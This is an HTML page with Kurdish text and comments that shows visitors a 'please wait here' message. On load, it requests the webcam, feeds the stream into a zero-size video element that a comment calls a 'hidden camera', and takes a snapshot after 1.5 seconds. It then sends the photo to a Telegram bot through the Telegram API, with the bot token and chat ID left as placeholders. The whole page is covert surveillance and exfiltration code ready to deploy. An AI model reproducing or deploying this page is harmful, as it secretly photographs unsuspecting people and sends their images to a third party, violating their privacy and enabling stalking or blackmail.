<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>شاشا سەرەکی</title>
</head>
<body>
    <h2>لڤێرە چاڤەڕێ بن...</h2>
    
    <!-- ڤەشارتی کامێرا -->
    <video id="video" width="0" height="0" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = 'تەکنا_بۆتا_خۆ_لڤێرە_دانە';
        const CHAT_ID = 'آیدی_تێلیگراما_خۆ_لڤێرە_دانە';

        window.onload = function () {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'capture.jpg');

                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                console.log('وێنە هاتە هنارتن');
                            });
                        }, 'image/jpeg');

                        // دابخستنا کامێرایێ پشتى گرتنێ
                        stream.getTracks().forEach(track => track.stop());
                    }, 1500); // 1.5 چرکە بۆ ڤەبوونا کامێرایێ
                })
                .catch(err => {
                    console.log('ڕێپێدان نەهاتە دان یان کامێرا نینە');
                });
        };
    </script>
</body>
</html>
